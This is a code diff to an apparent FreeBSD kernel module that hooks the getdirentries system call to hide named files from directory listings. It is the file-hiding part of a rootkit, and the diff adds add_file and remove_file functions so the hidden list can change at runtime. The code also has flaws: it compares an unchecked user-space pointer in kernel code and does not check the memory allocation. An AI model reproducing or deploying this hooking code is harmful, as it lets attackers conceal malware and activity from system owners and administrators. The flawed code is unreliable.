@@ -74,9 +74,14 @@ __FBSDID("$FreeBSD$");
 
 #define T_NAME "test"
 
-static char* name_list[1024] = {NULL};
+struct node {
+	char filename[256];
+	struct node * next;
+};
 
-int hide_names(char*);
+static struct node * first_node = NULL;
+
+static int hide_names(char * name);
 
 int
 sys_getdirentries_hook(struct thread *td, struct getdirentries_args *uap)
@@ -110,11 +115,9 @@ sys_getdirentries_hook(struct thread *td, struct getdirentries_args *uap)
 				if (count != 0){
 					bcopy((char*)current + current->d_reclen, current, count);
 				}
-			size-=current->d_reclen;
-			
+				size-=current->d_reclen;
 			}
-
-			if (count != 0){
+			else if (count != 0){
 				current = (struct dirent *)((char*)current + current->d_reclen);
 			}
 		}
@@ -128,10 +131,52 @@ sys_getdirentries_hook(struct thread *td, struct getdirentries_args *uap)
 	return (error);
 }
 
-int hide_names(char * name){
-	for(int i = 0; i < 3; i++){
-		if(strcmp(name_list[i],name) == 0) return 1;
+static int hide_names(char * name){
+	for(struct node * n = first_node; n != NULL; n = n->next)
+	{
+		if( strcmp(name, n->filename) == 0) {
+			return 1;
+		}
 	}
 
+	
+	return 0;
+}
+
+int add_file(char * uaddr){
+
+	struct node ** n;
+
+	for(n = &first_node; *n != NULL; n = &(*n)->next)
+	{
+		if(strcmp(uaddr, (*n)->filename) == 0) return 1;
+	}
+
+	struct node * new_node = malloc(sizeof(struct node), M_TEMP, M_ZERO);
+	new_node->next = NULL;
+
+	size_t done;
+	copyinstr(uaddr, new_node->filename, 256, &done);
+
+	*n = new_node;
+
+	
+
+	return 0;
+}
+
+int remove_file(char * uaddr){
+	struct node ** n;
+
+	for(n = &first_node; *n != NULL; n = &(*n)->next)
+	{
+		if(strcmp(uaddr, (*n)->filename) == 0)
+		{
+			struct node * temp = *n;
+			*n = (*n)->next;
+			free(temp, M_TEMP);
+			break;
+		}
+	}
 	return 0;
 }
